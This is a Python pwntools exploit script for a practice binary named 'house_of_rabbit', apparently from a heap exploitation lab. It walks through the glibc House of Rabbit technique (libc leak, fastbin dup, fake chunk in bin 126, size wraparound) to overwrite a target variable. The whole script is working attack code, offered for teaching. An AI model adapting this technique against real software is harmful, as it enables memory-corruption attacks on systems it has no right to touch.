#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_rabbit', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+359

b *main+593
b *main+660

b *main+755

b *main+793


"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "amend age" option; send new value.
def amend_age(age):
    io.send(b"3")
    io.sendafter(b"age: ", f"{age}".encode())
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- PREPARE A FAKE CHUNK -=-=-=

# Craft a fake chunk using the "age" field.
# Set its prev_inuse flag to avoid backward consolidation.
# This fake chunk has a size of 0, so it acts as its own forward consolidation guard.
age = 1;

io.sendafter(b"age: ", f"{age}".encode())
io.recvuntil(b"> ")


# =-=-=- INCREASE MMAP THRESHOLD -=-=-=

# Before we can increase the main arena's system_mem value, we must increase the mmap_threshold.
# We do this by requesting then freeing a chunk with size beyond the mmap threshold.
mem = malloc(0x5fff8, b"Y"*8) # Allocated via mmap().
free(mem) # Freeing an mmapped chunk increases the mmap threshold to its size.


# =-=-=- INCREASE SYSTEM_MEM -=-=-=

# Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them
# from a heap, rather than via mmap().
# This in turn will increase the total memory checked out from the kernel, which is tracked by
# an arena's system_mem field.
mem = malloc(0x5fff8, b"Z"*8)


# =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-=

# Leverage a fastbin dup to link the fake "age" chunk into the 0x20 fastbin.
dup = malloc(0x18, b"A"*8)
safety = malloc(0x18, b"B"*8)

free(dup)
free(safety)
free(dup)

malloc(0x18, pack(elf.sym.user)) # Address of fake chunk.


# =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-=

# Trigger malloc_consolidate() to move the fake chunk from the fastbins into the unsortedbin.
# Use a consolidation with the top chunk to achieve this.
consolidate = malloc(0x88, b"C"*8)
free(consolidate)


# =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-=

# Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it,
# then requesting a chunk larger than the fake chunk.
# This part is where the unsortedbin size sanity check would catch us if we hadn't increased system_mem.
amend_age(0x80001)
malloc(0x80008, b"D"*8)

# Increase the fake chunk size so that it can wrap around the VA space to reach the target data.
amend_age(0xfffffffffffffff1)


# =-=-=- OVERWRITE TARGET DATA -=-=-=

# Request a large chunk to bridge the gap between the fake chunk and the target.
distance = delta(elf.sym.user, elf.sym.target - 0x20)
malloc(distance, b"E"*8)

# The next request is serviced by the fake chunk's remainder and the first qword of user data overlaps the target data.
malloc(24, b"Much win\0")

# Check that the target data was overwritten.
io.sendthen(b"target: ", b"4")
target_data = io.recvuntil(b"\n", True)
assert target_data == b"Much win"
io.recvuntil(b"> ")

# =============================================================================

io.interactive()